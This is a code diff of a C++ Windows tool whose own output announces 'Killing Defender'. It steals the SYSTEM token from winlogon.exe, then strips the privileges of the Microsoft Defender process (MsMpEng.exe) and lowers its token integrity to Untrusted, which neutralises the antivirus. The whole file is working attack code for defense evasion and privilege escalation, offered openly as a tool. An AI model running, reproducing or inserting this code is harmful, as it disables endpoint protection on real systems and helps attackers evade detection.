@@ -10,8 +10,8 @@
 #include <iostream>
 #include <TlHelp32.h>
 
-#include <conio.h>
 
+#include <conio.h>
 
 bool EnableDebugPrivilege()
 {
@@ -56,7 +56,7 @@ int getpid(LPCWSTR procname) {
             processName = processEntry.szExeFile;
             procPID = processEntry.th32ProcessID;
         }
-        printf("[+] Got target proc PID: %d\n", procPID);
+        printf("[+] Got %ls PID: %d\n", procname, procPID);
     }
 
     return procPID;
@@ -111,106 +111,117 @@ BOOL SetPrivilege(
     return TRUE;
 }
 
-
 int main(int argc, char** argv)
 {
     LUID sedebugnameValue;
     EnableDebugPrivilege();
-
-    wchar_t procname[80] = L"MsMpEng.exe";
-
+    //Get pid for winlogon process
+    wchar_t procname[80] = L"winlogon.exe";
     int pid = getpid(procname);
+    //Open handle to winlogon
+    HANDLE phandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); //PROCESS_QUERY_LIMITED_INFORMATION
+    //Open winlogon process token
+    HANDLE ptoken;
+    OpenProcessToken(phandle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, &ptoken);
+    //Impersonate System via winlogon's process token
+    if (ImpersonateLoggedOnUser(ptoken)){
 
+        printf("[*] Impersonated System!\n");
+    }
+    else {
+        printf("[-] Failed to impersonate System...\n");
+    }
+    CloseHandle(phandle);
+    CloseHandle(ptoken);
+    wchar_t procname2[80] = L"MsMpEng.exe";
+    pid = getpid(procname2);
 
-   // printf("PID %d\n", pid);
-	printf("[*] Killing Defender...\n");
+    // printf("PID %d\n", pid);
+    printf("[*] Killing Defender...\n");
 
     // hardcoding PID of msmpeng for now
-	HANDLE phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid); //PROCESS_QUERY_LIMITED_INFORMATION
 
-	if (phandle != INVALID_HANDLE_VALUE) {
+    if (phandle != INVALID_HANDLE_VALUE) {
 
-		printf("[*] Opened Target Handle\n");
-	}
+        printf("[*] Opened Target Handle\n");
+    }
     else {
         printf("[-] Failed to open Process Handle\n");
     }
 
-   // printf("%p\n", phandle);
-  
-    HANDLE ptoken;
+    // printf("%p\n", phandle);
+    
+    BOOL token = OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &ptoken);
 
-   BOOL token = OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &ptoken);
-
-   if (token) {
-       printf("[*] Opened Target Token Handle\n");
-   }
-   else {
-       printf("[-] Failed to open Token Handle\n");
-   }
-
-   LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue);
+    if (token) {
+        printf("[*] Opened Target Token Handle\n");
+    }
+    else {
+        printf("[-] Failed to open Target Token Handle\n");
+    }
+    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue);
 
 
-   TOKEN_PRIVILEGES tkp;
-  
-   tkp.PrivilegeCount = 1;
-   tkp.Privileges[0].Luid = sedebugnameValue;
-   tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    TOKEN_PRIVILEGES tkp;
 
-   if (!AdjustTokenPrivileges(ptoken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
+    tkp.PrivilegeCount = 1;
+    tkp.Privileges[0].Luid = sedebugnameValue;
+    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-       printf("[-] Failed to Adjust Token's Privileges\n");
-       return 0;
-   }
+    if (!AdjustTokenPrivileges(ptoken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
 
-  
-   // Remove all privileges
-   SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);
-   SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);
-   SetPrivilege(ptoken, SE_TCB_NAME, TRUE);
-   SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);
-   SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);
-   SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);
-   SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);
-   SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);
-   SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
-   SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);
-   SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);
-   SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);
-   SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);
-   SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
-
-   printf("[*] Removed All Privileges\n");
+        printf("[-] Failed to Adjust Token's Privileges\n");
+        return 0;
+    }
 
 
-   DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;
+    // Remove all privileges
+    SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);
+    SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);
+    SetPrivilege(ptoken, SE_TCB_NAME, TRUE);
+    SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);
+    SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);
+    SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);
+    SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);
+    SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);
+    SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
+    SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);
+    SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);
+    SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);
+    SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);
+    SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
+
+    printf("[*] Removed All Privileges\n");
 
 
-   SID integrityLevelSid{};
-   integrityLevelSid.Revision = SID_REVISION;
-   integrityLevelSid.SubAuthorityCount = 1;
-   integrityLevelSid.IdentifierAuthority.Value[5] = 16;
-   integrityLevelSid.SubAuthority[0] = integrityLevel;
+    DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;
 
-   TOKEN_MANDATORY_LABEL tokenIntegrityLevel = {};
-   tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;
-   tokenIntegrityLevel.Label.Sid = &integrityLevelSid;
 
-   if (!SetTokenInformation(
-       ptoken,
-       TokenIntegrityLevel,
-       &tokenIntegrityLevel,
-       sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(&integrityLevelSid)))
-   {
-       printf("SetTokenInformation failed\n");
-   }else{
+    SID integrityLevelSid{};
+    integrityLevelSid.Revision = SID_REVISION;
+    integrityLevelSid.SubAuthorityCount = 1;
+    integrityLevelSid.IdentifierAuthority.Value[5] = 16;
+    integrityLevelSid.SubAuthority[0] = integrityLevel;
 
-   printf("[*] Token Integrity set to Untrusted\n");
-   }
+    TOKEN_MANDATORY_LABEL tokenIntegrityLevel = {};
+    tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;
+    tokenIntegrityLevel.Label.Sid = &integrityLevelSid;
 
-   CloseHandle(ptoken);
-   CloseHandle(phandle);
+    if (!SetTokenInformation(
+        ptoken,
+        TokenIntegrityLevel,
+        &tokenIntegrityLevel,
+        sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(&integrityLevelSid)))
+    {
+        printf("SetTokenInformation failed\n");
+    }
+    else {
 
+        printf("[*] Token Integrity set to Untrusted\n");
+    }
+
+    CloseHandle(ptoken);
+    CloseHandle(phandle);
+    
 }
-
